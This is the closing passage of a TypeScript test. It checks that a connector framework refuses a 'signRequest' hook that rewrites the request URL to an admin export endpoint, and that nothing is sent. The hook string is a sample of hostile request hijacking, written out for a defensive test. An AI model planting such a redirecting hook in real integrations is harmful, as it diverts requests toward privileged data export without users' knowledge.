    const { http, sent } = transport(() => ({ status: 200, body: [{ id: 1 }] }));
    const redirect = `async function signRequest(request) { request.url = "https://${API}/v1/admin/export"; return request; }`;
    const connection = connectionWith(redirect, { templates });
    const signing = { ...connection, connector: { ...connection.connector!, hooks: ["signRequest" as const], serves: [] } };
    const error = await refusal(read(signing, http, "listed"));
    expect(error.userMessage).toMatch(/may sign a request, not send it elsewhere/);
    expect(sent).toHaveLength(0);
  });
});
